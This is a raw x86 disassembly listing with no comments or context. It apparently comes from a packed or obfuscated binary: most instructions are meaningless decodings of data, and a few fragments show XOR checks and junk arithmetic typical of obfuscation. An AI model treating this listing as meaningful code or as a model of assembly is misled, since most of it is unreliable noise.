  4112da:	cmp    cl,ah
  4112dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112dd:	dec    ebp
  4112de:	xchg   edx,eax
  4112df:	retf   
  4112e0:	idiv   DWORD PTR [ecx]
  4112e2:	dec    edx
  4112e3:	cmp    eax,0x47ba6316
  4112e8:	push   edi
  4112e9:	lods   al,BYTE PTR ds:[esi]
  4112ea:	cmp    DWORD PTR [edi],0x6e
  4112ed:	aad    0x2f
  4112ef:	xor    dh,BYTE PTR [eax+0xbce83c5]
  4112f5:	in     eax,dx
  4112f6:	dec    edx
  4112f7:	jb     0x411314
  4112f9:	(bad)  
  4112fa:	imul   ebx,ebp,0x463ebe18
  411300:	stc    
  411301:	cmp    BYTE PTR [esp+eax*2],bh
  411304:	inc    edx
  411305:	sub    eax,0x32ae0e4c
  41130a:	mov    ah,0xe7
  41130c:	das    
  41130d:	mov    eax,ds:0x94d98f29
  411312:	fcmovnbe st,st(3)
  411314:	mov    bh,0xa
  411316:	rcl    DWORD PTR [ecx],cl
  411318:	loop   0x4112ed
  41131a:	aaa    
  41131b:	ret    0x7f47
  41131e:	mov    edi,gs
  411320:	adc    ebp,DWORD PTR [ebx+0x324bb52c]
  411326:	add    edx,DWORD PTR [ebx-0x5b10dace]
  41132c:	lea    ebx,[edi]
  41132e:	ss jp  0x41131e
  411331:	int3   
  411332:	mov    ds:0x1263781f,al
  411337:	(bad)  
  411338:	rcr    BYTE PTR [edx-0x3c],1
  41133b:	f2xm1  
  41133d:	ret    0x52b
  411340:	mov    DWORD PTR [ecx+ebp*2],edi
  411343:	fadd   DWORD PTR [edx]
  411345:	and    al,BYTE PTR [edx-0x558c54be]
  41134b:	add    ecx,0xe1b30112
  411351:	and    al,BYTE PTR ds:0x3e5a4633
  411357:	cdq    
  411358:	aad    0x3f
  41135a:	je     0x41134c
  41135c:	out    dx,al
  41135d:	pop    eax
  41135e:	outs   dx,DWORD PTR ds:[esi]
  41135f:	inc    eax
  411360:	enter  0xd2f1,0x8
  411364:	xchg   ecx,eax
  411365:	pop    ebx
  411366:	sub    DWORD PTR [eax+0x747b50f3],ecx
  41136c:	pop    eax
  41136d:	and    BYTE PTR ds:0x279f3e61,bh
  411373:	xor    ch,ch
  411375:	sar    edx,0x1f
  411378:	adc    eax,0x448a922b
  41137d:	add    eax,0xc558ba8
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x635adaa1],ecx
  4113db:	fwait
  4113dc:	add    DWORD PTR [eax+0x7e],eax
  4113df:	jle    0x4113d2
  4113e1:	jg     0x411461
  4113e3:	jle    0x411449
  4113e5:	xstore-rng (bad)
  4113e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e7:	add    dl,BYTE PTR [ebx]
  4113e9:	out    0x99,al
  4113eb:	fcmove st,st(7)
  4113ed:	in     al,dx
  4113ee:	mov    bh,0x19
  4113f0:	jbe    0x4113d6
  4113f2:	pop    es
  4113f3:	pop    dx
  4113f5:	mov    al,0x88
  4113f7:	mov    al,ds:0x529a9b48
  4113fc:	addr16 mov eax,0x63a40fd5
  411402:	call   0xe239:0x780cbe66
  411409:	loope  0x411396
  41140b:	mov    eax,0xaade3bb0
  411410:	or     BYTE PTR [ecx],bl
  411412:	jg     0x41146c
  411414:	mov    ch,0xf4
  411416:	adc    ebx,esp
  411418:	sbb    eax,0x730b785e
  41141d:	cs sub al,0xff
  411420:	xor    DWORD PTR [edx+ebp*1-0x1c],ecx
  411424:	add    BYTE PTR [ecx-0x3b4d513],ah
  41142a:	mov    bl,0xc3
  41142c:	pusha  
  41142d:	pop    es
  41142e:	(bad)  
  41142f:	outs   dx,BYTE PTR ds:[esi]
  411430:	push   ss
  411431:	dec    ebx
  411432:	je     0x4113ce
  411434:	dec    ebx
  411435:	jo     0x4114a0
  411437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411439:	adc    ebx,esi
  41143b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41143c:	sti    
  41143d:	arpl   WORD PTR [eax+eax*2],cx
  411440:	or     DWORD PTR [edi-0x93840c1],0x2e5a5691
  41144a:	or     dh,BYTE PTR [ebp+eiz*4-0x20]
  41144e:	arpl   WORD PTR [ebp+edi*1-0xd6090d],ax
  411455:	jmp    0x4114ca
  411457:	jb     0x411401
  411459:	jnp    0x411480
  41145b:	repnz and DWORD PTR [ebx],esp
  41145e:	shl    DWORD PTR [edi+0x6253d120],cl
  411464:	repnz sbb al,0x33
  411467:	add    al,0xfe
  411469:	dec    esp
  41146a:	ret    0x4853
  41146d:	dec    eax
  41146e:	int3   
  41146f:	pop    esp
  411470:	mov    edx,0x29f7bab2
  411475:	call   0x5e6cfb09
  41147a:	xor    ch,cl
  41147c:	stos   DWORD PTR es:[edi],eax
  41147d:	dec    esi
  41147e:	hlt    
  41147f:	adc    bh,bl
  411481:	je     0x41147b
  411483:	stc    
  411484:	mov    esi,0xf481ab8d
  411489:	pop    edi
  41148a:	adc    eax,0xcc1a4e09
  41148f:	or     dl,BYTE PTR [edx]
  411491:	push   DWORD PTR gs:[ebx-0x52564bee]
  411498:	in     al,dx
  411499:	popa   
  41149a:	sbb    BYTE PTR [esi-0x1d92de0],bl
  4114a0:	es ins DWORD PTR es:[edi],dx
  4114a2:	sbb    eax,0xd02e7082
  4114a7:	mov    bh,0xac
  4114a9:	std    
  4114aa:	jns    0x411507
  4114ac:	jae    0x41152b
  4114ae:	or     DWORD PTR [edi-0x11],eax
  4114b1:	(bad)  
  4114b2:	fldcw  WORD PTR [ecx+ecx*8-0x54546393]
  4114b9:	cs out dx,eax
  4114bb:	mov    al,0xd8
  4114bd:	test   al,0x5d
  4114bf:	scas   eax,DWORD PTR es:[edi]
  4114c0:	dec    esp
  4114c1:	pop    ecx
  4114c2:	mov    dh,0x60
  4114c4:	call   0x8d87:0xfdcc248
  4114cb:	es out 0x3e,al
  4114ce:	fld    TBYTE PTR [edi-0x2f]
  4114d1:	out    dx,eax
  4114d2:	nop
  4114d3:	sti    
  4114d4:	mov    al,0x76
  4114d6:	cmp    BYTE PTR ds:0x3dd2575e,0xbd
  4114dd:	dec    eax
  4114de:	mov    DWORD PTR [ebp-0x3dd38afb],ecx
  4114e4:	push   ebx
  4114e5:	mov    ch,BYTE PTR [esp+ebp*8+0x1974ddb2]
  4114ec:	jo     0x411557
  4114ee:	cmc    
  4114ef:	jbe    0x4114a0
  4114f1:	ds push esp
  4114f3:	jecxz  0x411506
  4114f5:	inc    esi
  4114f6:	pushf  
  4114f7:	imul   ebp,DWORD PTR [eax+0x19],0x4b493c03
  4114fe:	test   al,0xd3
  411500:	aas    
  411501:	dec    esp
  411502:	ret    0xe77a
  411505:	loope  0x4114a4
  411507:	test   al,0x51
  411509:	scas   al,BYTE PTR es:[edi]
  41150a:	sbb    ebp,esi
  41150c:	retf   0xa20e
  41150f:	into   
  411510:	pop    ss
  411511:	outs   dx,BYTE PTR ds:[esi]
  411512:	xlat   BYTE PTR ds:[ebx]
  411513:	loope  0x411497
  411515:	lods   al,BYTE PTR ds:[esi]
  411516:	cmc    
  411517:	dec    edi
  411518:	add    dl,BYTE PTR [ecx]
  41151a:	fnstenv [esi]
  41151c:	scas   al,BYTE PTR es:[edi]
  41151d:	push   ss
  41151e:	cmp    eax,0xa6fd24ab
  411523:	das    
  411524:	aam    0xa7
  411526:	inc    esi
  411527:	lods   eax,DWORD PTR ds:[esi]
  411528:	sti    
  411529:	pop    ebp
  41152a:	aaa    
  41152b:	xchg   edx,eax
  41152c:	or     ch,BYTE PTR [ebx-0x23]
  41152f:	lods   al,BYTE PTR ds:[esi]
  411530:	sahf   
  411531:	cmp    al,0x51
  411533:	popf   
  411534:	ret    0xc2ef
  411537:	and    BYTE PTR [esp+ecx*1+0x6580184],dh
  41153e:	lea    edi,[ecx+0x7216c8d0]
  411544:	fcmovu st,st(1)
  411546:	packsswb mm7,QWORD PTR [eax+esi*1-0x36873651]
  41154e:	icebp  
  41154f:	cdq    
  411550:	icebp  
  411551:	add    eax,DWORD PTR [edi]
  411553:	mov    bl,0x71
  411555:	dec    eax
  411556:	fld    TBYTE PTR [ecx-0x7b868d02]
  41155c:	pop    edx
  41155d:	ret    
  41155e:	retf   0xf320
  411561:	inc    esp
  411562:	inc    DWORD PTR ds:[ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	test   al,0x9
  411583:	test   DWORD PTR [edx],edi
  411585:	add    BYTE PTR [ecx+0x7e],0x7e
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115b1
  41158e:	xchg   edx,esp
  411590:	mov    esi,0xffd65640
  411595:	push   edi
  411596:	call   0xbbafbc8b
  41159b:	and    ch,cl
  41159d:	arpl   WORD PTR [eax+eiz*4-0x1b70e371],bp
  4115a4:	fucomip st,st(7)
  4115a6:	pop    ebx
  4115a7:	sbb    BYTE PTR [edx+0x7a],bl
  4115aa:	inc    ecx
  4115ab:	jb     0x4115e3
  4115ad:	add    al,0x4c
  4115af:	addr16 pop esp
  4115b1:	arpl   cx,si
  4115b3:	dec    eax
  4115b4:	and    eax,0x7655b1eb
  4115b9:	sbb    esp,esi
  4115bb:	sbb    ecx,esi
  4115bd:	xchg   esp,eax
  4115be:	imul   ebx,DWORD PTR [esi+0x53b07201],0x60
  4115c5:	addr16 pop ebp
  4115c7:	jle    0x411559
  4115c9:	or     eax,0x8d745c2f
  4115ce:	xor    BYTE PTR [edi+0x51],dh
  4115d1:	outs   dx,BYTE PTR ds:[esi]
  4115d2:	cmp    edi,0x36
  4115d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d6:	jge    0x41156b
  4115d8:	xor    dh,BYTE PTR [esi+ebx*1+0x25]
  4115dc:	stos   BYTE PTR es:[edi],al
  4115dd:	mov    bl,0x26
  4115df:	(bad)  
  4115e0:	cld    
  4115e1:	cli    
  4115e2:	jb     0x41165e
  4115e4:	adc    eax,0xa40a3a1d
  4115e9:	not    WORD PTR [eax]
  4115ec:	lods   al,BYTE PTR ds:[esi]
  4115ed:	push   ecx
  4115ee:	sbb    eax,0x89cdc714
  4115f3:	cmp    bh,BYTE PTR [eax]
  4115f5:	xchg   ebp,eax
  4115f6:	inc    ebp
  4115f7:	fcomp  DWORD PTR [edx]
  4115f9:	sysexit 
  4115fb:	and    edx,DWORD PTR [esi+eiz*1-0x79]
  4115ff:	sub    eax,0x494d89de
  411604:	repnz lods eax,DWORD PTR ds:[esi]
  411606:	ins    DWORD PTR es:[edi],dx
  411607:	shl    cl,0x92
  41160a:	sub    bh,BYTE PTR [eax]
  41160c:	sub    DWORD PTR [edi],edi
  41160e:	pop    ebx
  41160f:	jg     0x411672
  411611:	hlt    
  411612:	hlt    
  411613:	loopne 0x4115d2
  411615:	inc    ebp
  411616:	xchg   ecx,eax
  411617:	iret   
  411618:	cmp    BYTE PTR [edi],ah
  41161a:	cdq    
  41161b:	mov    BYTE PTR [ebp+0x78],dl
  41161e:	mov    WORD PTR [ebp-0x4c],es
  411621:	test   al,0x79
  411623:	inc    ecx
  411624:	xor    cl,al
  411626:	jl     0x411610
  411628:	call   0xf0be:0x541ac367
  41162f:	sti    
  411630:	out    dx,al
  411631:	lods   eax,DWORD PTR ds:[esi]
  411632:	sbb    BYTE PTR [bx+di],ah
  411635:	shr    DWORD PTR ds:0x630d1cd6,1
  41163b:	xchg   esp,eax
  41163c:	cs inc ecx
  41163e:	sbb    al,0x6d
  411640:	mov    bl,0x98
  411642:	lds    edi,FWORD PTR [esi+eiz*8-0x51]
  411646:	test   BYTE PTR [edx+0x5b],dl
  411649:	mov    esp,0x5bfacf4d
  41164e:	ret    0xca43
  411651:	mov    WORD PTR [ecx],ds
  411653:	and    ebx,esi
  411655:	fwait
  411656:	pop    ecx
  411657:	mov    WORD PTR ds:0x1e0696e3,fs
  41165d:	jmp    0x411659
  41165f:	fdivr  QWORD PTR [edx]
  411661:	adc    al,0xaf
  411663:	pop    ebp
  411664:	lods   eax,DWORD PTR ds:[esi]
  411665:	in     eax,dx
  411666:	dec    esi
  411667:	mov    ds:0xf66d1384,al
  41166c:	mov    al,0x48
  41166e:	sbb    edi,esi
  411670:	jmp    0x138c:0xff0d1984
  411677:	hlt    
  411678:	add    eax,0x5072b21d
  41167d:	xlat   BYTE PTR ds:[ebx]
  41167e:	rol    ebp,cl
  411680:	adc    al,0x53
  411682:	outs   dx,DWORD PTR ds:[esi]
  411683:	xchg   esi,eax
  411684:	xor    DWORD PTR [ebx],esi
  411686:	adc    DWORD PTR [eax-0x259b4e0b],edi
  41168c:	ret    
  41168d:	sub    al,0xc
  41168f:	or     DWORD PTR [esi-0x32],ebx
  411692:	pop    esp
  411693:	mov    eax,ds:0xc03eb208
  411698:	hlt    
  411699:	test   BYTE PTR [ebx-0x1d],0xf2
  41169d:	imul   eax,eax,0x6b2624bf
  4116a3:	ret    0xabcd
  4116a6:	add    cl,dh
  4116a8:	dec    esp
  4116a9:	jg     0x4116e2
  4116ab:	inc    esi
  4116ac:	(bad)
  4116af:	jne    0x4116c0
  4116b1:	mov    al,ds:0x43a8ff5c
  4116b6:	popa   
  4116b7:	adc    DWORD PTR [edx+0x4b98d35a],edi
  4116bd:	iret   
  4116be:	int3   
  4116bf:	or     al,0x63
  4116c1:	jae    0x41173f
  4116c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c4:	mov    cl,0xcc
  4116c6:	xor    al,0x8a
  4116c8:	jns    0x4116f8
  4116ca:	or     DWORD PTR cs:[ebx-0xc],0xaa15e60f
  4116d2:	(bad)  
  4116d3:	cmp    eax,0x9452a734
  4116d8:	push   ebp
  4116d9:	shr    BYTE PTR [edi-0x5154fb06],cl
  4116df:	std    
  4116e0:	les    eax,FWORD PTR [edx+0x78fb27b]
  4116e6:	out    dx,al
  4116e7:	mov    edx,0x5a3c4f65
  4116ec:	popf   
  4116ed:	(bad)  
  4116ee:	fnstcw WORD PTR [ecx]
  4116f0:	int    0x1
  4116f2:	cmp    esi,DWORD PTR [ebx]
  4116f4:	div    edi
  4116f6:	inc    esi
  4116f7:	mov    dh,0x34
  4116f9:	push   ds
  4116fa:	sbb    BYTE PTR [ecx+edi*1-0x3ef75d70],ah
  411701:	call   esi
  411703:	mov    dl,0xf5
  411705:	inc    edx
  411706:	mov    al,0x7
  411708:	aaa    
  411709:	push   esp
  41170a:	and    BYTE PTR [edx-0x75],bl
  41170d:	dec    ebp
  41170e:	adc    BYTE PTR [ebx],al
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4336ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4336fb,0x4336c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433703,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43372b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4336bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x662ae6dd
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411808
  41178e:	dec    ebp
  41178f:	(bad)  
  411790:	fidiv  DWORD PTR [eax-0x66]
  411793:	xchg   edx,eax
  411794:	dec    edx
  411795:	xor    dl,bh
  411797:	sbb    bh,cl
  411799:	fcmovnb st,st(5)
  41179b:	test   al,0xa
  41179d:	mov    ah,0xda
  41179f:	(bad)  
  4117a0:	lods   al,BYTE PTR ds:[esi]
  4117a1:	int    0xc5
  4117a3:	mov    ah,0xd0
  4117a5:	(bad)  
  4117a6:	iret   
  4117a7:	and    BYTE PTR [ebp-0x7e62dd5b],0x16
  4117ae:	xor    al,0xe0
  4117b0:	cwde   
  4117b1:	lea    ebx,[edx+ecx*4]
  4117b4:	leave  
  4117b5:	mov    ds:0xd9ab5c72,al
  4117ba:	popf   
  4117bb:	xchg   BYTE PTR [eax+eax*8-0xd],cl
  4117bf:	fsubr  st(0),st
  4117c1:	sbb    ecx,edi
  4117c3:	(bad)  
  4117c4:	mov    WORD PTR [esi],fs
  4117c6:	pop    eax
  4117c7:	out    dx,eax
  4117c8:	hlt    
  4117c9:	popf   
  4117ca:	xor    al,0xd3
  4117cc:	xor    esi,DWORD PTR [ecx+0x4e09d995]
  4117d2:	jbe    0x411801
  4117d4:	push   0x75813188
  4117d9:	daa    
  4117da:	and    eax,0x348d2592
  4117df:	(bad)
  4117e2:	out    dx,eax
  4117e3:	jge    0x411813
  4117e5:	push   es
  4117e6:	cmp    al,0x5e
  4117e8:	pop    ebx
  4117e9:	stc    
  4117ea:	fcmovnb st,st(0)
  4117ec:	fbld   TBYTE PTR [ebp-0x7c54e3ea]
  4117f2:	stos   DWORD PTR es:[edi],eax
  4117f3:	je     0x411849
  4117f5:	cmp    esp,ecx
  4117f7:	lahf   
  4117f8:	mov    ch,0x9c
  4117fa:	sti    
  4117fb:	xor    BYTE PTR [edi-0x489e0e22],cl
  411801:	add    DWORD PTR [edx-0x28],ecx
  411804:	xor    dh,BYTE PTR [ebx+0x36ce78db]
  41180a:	cmp    eax,0x9958b731
  41180f:	jnp    0x4117ea
  411811:	addr16 mov ebp,0x78e32990
  411817:	xchg   DWORD PTR [ebx+0x7d3bda7f],eax
  41181d:	add    DWORD PTR [eax],edx
  41181f:	pop    ds
  411820:	shl    DWORD PTR [eax+0x3867de83],1
  411826:	mov    esp,0x7c297c5d
  41182b:	out    dx,eax
  41182c:	inc    esp
  41182d:	shr    DWORD PTR [ecx+eiz*2],cl
  411830:	cmp    eax,0x4cc85a99
  411835:	fcomp  DWORD PTR [ebp-0x472ad060]
  41183b:	ret    0x1d60
  41183e:	mov    ch,0xfe
  411840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411841:	test   al,0x44
  411843:	lods   eax,DWORD PTR ds:[esi]
  411844:	mov    bl,0xf8
  411846:	mov    ds:0x689a1a95,al
  41184b:	push   esp
  41184c:	rcr    ebx,0x48
  41184f:	dec    edi
  411850:	xchg   ebp,eax
  411851:	popa   
  411852:	mov    bl,0x2a
  411854:	je     0x4117e8
  411856:	das    
  411857:	push   es
  411858:	sbb    edi,DWORD PTR [ecx+0x29]
  41185b:	call   0x789c:0xa65803c9
  411862:	push   ecx
  411863:	aam    0x22
  411865:	mov    eax,ds:0xb98908bd
  41186a:	push   esp
  41186b:	vprotb xmm9,xmm5,xmm0
  411870:	fnstsw WORD PTR [eax+0x77362d7d]
  411876:	out    dx,al
  411877:	inc    ebx
  411878:	and    al,0x12
  41187a:	call   0x684241e1
  41187f:	js     0x41187f
  411881:	inc    edi
  411882:	adc    BYTE PTR [edx],bh
  411884:	xchg   ebx,eax
  411885:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411887:	dec    ebp
  411888:	sti    
  411889:	(bad)  
  41188a:	cld    
  41188b:	loop   0x411846
  41188d:	ret    0xd0b1
  411890:	push   ds
  411891:	imul   esp,DWORD PTR [eax+ebp*1+0x6f],0xee24f74c
  411899:	shl    BYTE PTR [ebx+0x7b4493c6],cl
  41189f:	cmp    DWORD PTR [ebx],ecx
  4118a1:	je     0x411840
  4118a3:	addr16 nop
  4118a5:	idiv   DWORD PTR [edi]
  4118a7:	dec    edx
  4118a8:	sbb    DWORD PTR [eax-0x2951869c],edx
  4118ae:	lahf   
  4118af:	cld    
  4118b0:	sub    BYTE PTR [ecx+0x3d],dl
  4118b3:	sti    
  4118b4:	mov    ebx,0xec4b81be
  4118b9:	xor    eax,0x3b314f69
  4118be:	in     eax,0x36
  4118c0:	mov    dh,0xe8
  4118c2:	push   0x36
  4118c4:	loopne 0x4118ff
  4118c6:	adc    DWORD PTR [eax+0x39761678],ebx
  4118cc:	mov    cl,0x3c
  4118ce:	jmp    0x4118bd
  4118d0:	inc    edx
  4118d1:	(bad)  
  4118d2:	sahf   
  4118d3:	nop
  4118d4:	cmp    al,0x3d
  4118d6:	mov    eax,DWORD PTR [ebx]
  4118d8:	add    al,0x94
  4118da:	cmp    eax,0xfee19485
  4118df:	(bad)  
  4118e0:	mov    cl,0x47
  4118e2:	pop    ebx
  4118e3:	mov    dl,0x6b
  4118e5:	push   ebx
  4118e6:	jge    0x411875
  4118e8:	fs jnp 0x41194a
  4118eb:	inc    esp
  4118ec:	dec    ecx
  4118ed:	daa    
  4118ee:	jmp    0x41188a
  4118f0:	ret    
  4118f1:	sub    al,0x50
  4118f3:	mov    eax,ds:0x1586144c
  4118f8:	mov    ds,WORD PTR [eax+0x21]
  4118fb:	adc    bh,BYTE PTR [esi]
  4118fd:	out    dx,al
  4118fe:	push   ecx
  4118ff:	push   esp
  411900:	rol    BYTE PTR [eax-0x424debb9],cl
  411906:	dec    bh
  411908:	push   esi
  411909:	xor    BYTE PTR [edx],ah
  41190b:	cmp    DWORD PTR [edx],edi
  41190d:	sbb    ch,BYTE PTR [ebx]
  41190f:	mov    bh,0x14
  411911:	xchg   esi,eax
  411912:	lahf   
  411913:	push   ds
  411914:	psllw  mm0,QWORD PTR [edi]
  411917:	repnz icebp 
  411919:	stc    
  41191a:	cs or  eax,0x7625e2d9
  411920:	xchg   esp,eax
  411921:	mov    ebx,0x58430311
  411926:	pop    ebp
  411927:	sub    bh,BYTE PTR [edx+0x56]
  41192a:	mov    bl,0xcc
  41192c:	adc    al,0x20
  41192e:	shr    DWORD PTR [ecx+0x50f5589a],0xbd
  411935:	add    esi,DWORD PTR [esi]
  411937:	xlat   BYTE PTR ds:[ebx]
  411938:	(bad)  
  411939:	shl    BYTE PTR [edi+eax*2+0x8],cl
  41193d:	or     DWORD PTR [esi-0x1e],edx
  411940:	nop
  411941:	lock fdivr QWORD PTR [ebx]
  411944:	lea    ecx,[esi-0xfb5a51c]
  41194a:	sti    
  41194b:	push   ebx
  41194c:	cmp    ch,BYTE PTR [ecx+0x33aaadd5]
  411952:	punpcklwd mm0,mm1
  411955:	xor    ah,cl
  411957:	or     eax,0x94c97a88
  41195c:	icebp  
  41195d:	push   esp
  41195e:	mov    esp,0x46e28781
  411963:	jmp    0x2a05808d
  411968:	enter  0xb95c,0xa6
  41196c:	fisttp DWORD PTR [ecx+eax*8+0x11]
  411970:	inc    eax
  411971:	shl    dh,cl
  411973:	out    dx,eax
  411974:	neg    BYTE PTR [esi]
  411976:	scas   eax,DWORD PTR es:[edi]
  411977:	push   0x8d1e718c
  41197c:	aam    0xbb
  41197e:	xchg   ebp,eax
  41197f:	jle    0x4119d4
  411981:	aas    
  411982:	in     al,dx
  411983:	in     eax,0xfa
  411985:	sub    al,0x48
  411987:	add    DWORD PTR [ecx-0x1d],0xffffffd4
  41198b:	sahf   
  41198c:	add    cl,BYTE PTR [esi]
  41198e:	or     eax,0x6c8b9382
  411993:	mov    ecx,0x39933e97
  411998:	cmc    
  411999:	sbb    dh,BYTE PTR [eax+ecx*4-0x47]
  41199d:	cmp    al,0xde
  41199f:	jns    0x411940
  4119a1:	hlt    
  4119a2:	mov    gs,WORD PTR [edi-0x2099fbb2]
  4119a8:	jno    0x41194a
  4119aa:	pop    esp
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433623,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433727,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433727
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433727,eax
  4119d6:	cmp    DWORD PTR ds:0x433727,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433727,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x7f
  411a13:	pop    es
  411a14:	mov    ds:0x7e4d25ed,eax
  411a19:	jle    0x411a2b
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x411a07
  411a1f:	and    dl,dl
  411a21:	loopne 0x411a8e
  411a23:	pop    esi
  411a24:	sti    
  411a25:	sub    al,BYTE PTR [edi]
  411a27:	das    
  411a28:	pop    edi
  411a29:	pop    es
  411a2a:	jmp    0x411a16
  411a2c:	loope  0x4119e6
  411a2e:	push   ebp
  411a2f:	stos   DWORD PTR es:[edi],eax
  411a30:	cld    
  411a31:	iret   
  411a32:	sbb    edi,DWORD PTR [esi]
  411a34:	adc    ecx,DWORD PTR [edi-0x6fe25daa]
  411a3a:	adc    BYTE PTR [edi-0x16],0x24
  411a3e:	in     al,dx
  411a3f:	dec    ecx
  411a40:	mov    ds:0x29d2796c,eax
  411a45:	jp     0x411a62
  411a47:	lds    eax,FWORD PTR [ebx-0x42]
  411a4a:	call   0x11ba:0xa93182c6
  411a51:	leave  
  411a52:	and    al,0xcf
  411a54:	pop    ds
  411a55:	cdq    
  411a56:	jge    0x411a27
  411a58:	mov    edi,0x6aa67fb
  411a5d:	jg     0x59d19815
  411a63:	out    dx,al
  411a64:	out    0xdb,al
  411a66:	add    cl,al
  411a68:	js     0x411a1e
  411a6a:	pop    esi
  411a6b:	sub    esp,DWORD PTR [eax-0xb]
  411a6e:	dec    edx
  411a6f:	sbb    al,0x54
  411a71:	fst    DWORD PTR [esi]
  411a73:	popf   
  411a74:	inc    esi
  411a75:	adc    eax,0xd04fb498
  411a7a:	test   DWORD PTR [esi-0x65af6dc5],edx
  411a80:	xor    ah,BYTE PTR [edx-0x3c]
  411a83:	mov    al,ds:0x9df35205
  411a88:	fcomp  DWORD PTR [edx-0x342d6a6f]
  411a8e:	es (bad) 
  411a90:	jg     0x411a39
  411a92:	or     dh,BYTE PTR [edi]
  411a94:	ret    
  411a95:	inc    eax
  411a96:	aad    0x2d
  411a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a99:	inc    ebx
  411a9a:	adc    edi,edx
  411a9c:	icebp  
  411a9d:	jmp    0x963c:0x25071af7
  411aa4:	pusha  
  411aa5:	mov    edi,0x7d58177
  411aaa:	and    al,0xbb
  411aac:	or     al,0x4
  411aae:	mov    eax,ds:0x42905e70
  411ab3:	mov    esi,0xbd27efa1
  411ab8:	pop    eax
  411ab9:	(bad)  [ebx-0x5bc4b05f]
  411abf:	add    dl,BYTE PTR [edx]
  411ac1:	pop    ecx
  411ac2:	js     0x411b43
  411ac4:	jp     0x411ac9
  411ac6:	sahf   
  411ac7:	sbb    bl,BYTE PTR [edi-0x5b0dfc44]
  411acd:	in     eax,dx
  411ace:	mov    BYTE PTR [eax+0x5a51b9e4],ah
  411ad4:	enter  0x310,0xb1
  411ad8:	or     eax,0x9b7d702
  411add:	cwde   
  411ade:	fild   QWORD PTR [eax+ecx*4+0x3295095d]
  411ae5:	and    bh,BYTE PTR ds:[eax]
  411ae8:	mov    dh,BYTE PTR [edx+0x2d]
  411aeb:	test   al,0x8a
  411aed:	repz add bh,BYTE PTR [ecx+0x6c4d57ae]
  411af4:	stos   DWORD PTR es:[edi],eax
  411af5:	sub    al,0xea
  411af7:	jno    0x411aac
  411af9:	aam    0xf1
  411afb:	pop    esp
  411afc:	sub    eax,0x8e9614d4
  411b01:	ins    BYTE PTR es:[edi],dx
  411b02:	cdq    
  411b03:	gs inc ebx
  411b05:	cmc    
  411b06:	aas    
  411b07:	ds inc edi
